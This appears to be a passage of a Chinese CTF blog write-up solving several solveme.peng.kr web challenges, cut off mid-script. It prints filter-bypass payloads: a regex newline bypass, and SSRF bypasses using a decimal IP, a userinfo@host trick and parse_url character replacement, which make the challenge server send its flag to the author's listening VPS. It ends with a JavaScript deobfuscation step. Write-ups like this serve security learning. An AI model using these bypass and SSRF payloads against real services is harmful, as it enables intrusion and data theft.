class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'''15th_HackingCamp'''</span></span><br><span class="line">dit = []</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">dit.append((ord(i)+<span class="number">256</span>))</span><br><span class="line"><span class="comment">#print dit </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dit:</span><br><span class="line">payload += (<span class="string">'value[]='</span>+str(j)+<span class="string">'&amp;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload+<span class="string">'password=simple_passw0rd'</span></span><br></pre></td></tr></table></figure><p>得到payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure><p>最后得到flag</p><h3 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题题目漏洞出现在正则匹配那里<br>根据我们查到的资料，因为以’^’开头，以’$’结尾的只能匹配一行，也就是说我们可以用<code>%0a</code>/url编码下的换行/去绕过<br>于是我们可以构造payload:?say=<code>%0Agive_me_the_flag</code><br>得到flag</p><h3 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        <span class="keyword">if</span>($socket === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to create socket'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[<span class="string">'host'</span>]);</span><br><span class="line">        $port = is_null($parse[<span class="string">'port'</span>]) ? <span class="number">80</span> : $parse[<span class="string">'port'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socket_connect($socket, $host, $port) === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to connect'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = <span class="string">"HEAD /"</span>.$flag.<span class="string">" HTTP/1.1\r\n"</span>.</span><br><span class="line">            <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>.</span><br><span class="line">            <span class="string">"Connection: Close\r\n"</span>.</span><br><span class="line">            <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, <span class="number">1024</span>);var_dump($recv);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^HTTP\/1.1 200 OK\r\n/'</span>, $recv))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed response'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>跟上面一题类似，只是对于host有了过滤，这里我们用 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ip2long(<span class="string">"120.78.164.84"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Payload ：<br><code>givemealink2.solveme.peng.kr?url=http://2018419796:8080/plz%1agive%1ame</code><br>然后在服务器上面开监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><p>就可以接收到返回的flag</p><h3 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里发现这段代码的逻辑是用get方法接受一个参数url，而这个参数要经过三次的检测，第一次会把含有下划线，空白字符过滤掉，第二次过滤检验的是是否满足url的格式，而且必须含有<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>里面的内容也就是<code>http://givemealink.solveme.peng.kr/</code>，而第三次则判断路径下是否含有<code>plz_give_me</code>这个字段，突然发现这个东西跟第一个过滤下划线的自相矛盾，查一下PHP文档，问题出现在parse_url这个函数里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line"></span><br><span class="line">    The URL to parse. Invalid characters are replaced by _.</span><br></pre></td></tr></table></figure><p>非法字符在这个函数下会自动替换成下划线，测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = urldecode(<span class="string">"http://0verwatch.top/%1atest%1a.php"</span>);</span><br><span class="line">   var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"0verwatch.top"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"/_test_.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现这时候就可以利用这一点成功绕过第一个过滤，以及满足第三个过滤<br>这时候考虑第二个过滤，继续查看parse_url这个函数文档你会发现他有这样一个例子，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url));</span><br></pre></td></tr></table></figure></p><p>这也是url的一种写法，现在感觉很少用在http服务上感觉在ssh连接自己的服务器上面用的多，因为一般的url都是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></p><p>但是平常我们连接自己服务器的时候可以这样<code>ssh root@vps_ip</code> 然后输入密码，这应该也是这种类型的<br><a href="https://imgchr.com/i/P28fJO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28fJO.md.png" alt="P28fJO.md.png"></a></p><p>然后这里的话相当于username还有password没有任何实际作用，纯粹就是用来写那个$_SERVER[‘HTTP_HOST’]来进行绕过的<br>payload：<code>http://givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr@vps_ip/plz%1agive%1ame</code><br>我们再测试一下，结果完全符合我们绕过的要求<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"120.78.164.84"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">59</span>) <span class="string">"givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">12</span>) <span class="string">"/plz_give_me"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后就利用那一个<code>curl_setopt</code>函数往我们这边服务器发送flag了，vps这边监听80端口,出现flag</p><h3 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h3><p>点开发现存在一大堆Js混淆代码，解码一看发现有一堆数字很可疑<br><a href="https://imgchr.com/i/P28IQH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28IQH.md.png" alt="P28IQH.md.png"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;4&quot;+&quot;7&quot;,&quot;4&quot;+&quot;7&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;111&quot;,&quot;100&quot;,&quot;3&quot;+&quot;2&quot;,&quot;106&quot;,&quot;111&quot;,&quot;98&quot;,&quot;3&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;108&quot;,&quot;101&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;0&quot;+&quot;9&quot;,&quot;112&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;97&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;3&quot;+&quot;2&quot;,&quot;116&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;6&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;112&quot;,&quot;108&quot;,&quot;110&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;7&quot;,&quot;116&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;5&quot;+&quot;0&quot;,&quot;4&quot;+&quot;9&quot;,&quot;100&quot;,&quot;102&quot;,&quot;5&quot;+&quot;2&quot;,&quot;97&quot;,&quot;100&quot;,&quot;5&quot;+&quot;1&quot;,&quot;99&quot;,&quot;101&quot;,&quot;5&quot;+&quot;1&quot;,&quot;4&quot;+&quot;9&quot;,&quot;97&quot;,&quot;102&quot;,&quot;5&quot;+&quot;6&quot;,&quot;5&quot;+&quot;2&quot;,&quot;5&quot;+&quot;3&quot;,&quot;99&quot;,&quot;102&quot;,&quot;57&quot;,&quot;99&quot;,&quot;100&quot;,&quot;5&quot;+&quot;4&quot;,&quot;97&quot;,&quot;5&quot;+&quot;3&quot;,&quot;101&quot;,&quot;100&quot;,&quot;100&quot;,&quot;98&quot;,&quot;98&quot;,&quot;57&quot;,&quot;4&quot;+&quot;9&quot;,&quot;125&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;98&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;</span><br></pre></td></tr></table></figure></p><p>写个小脚本解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dit = [<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"111"</span>,<span class="string">"100"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"106"</span>,<span class="string">"111"</span>,<span class="string">"98"</span>,<span class="string">"3"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"9"</span>,<span class="string">"112"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"116"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"6"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"112"</span>,<span class="string">"108"</span>,<span class="string">"110"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"7"</span>,<span class="string">"116"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"5"</span>+<span class="string">"0"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"100"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"97"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"99"</span>,<span class="string">"101"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"6"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"99"</span>,<span class="string">"102"</span>,<span class="string">"57"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"5"</span>+<span 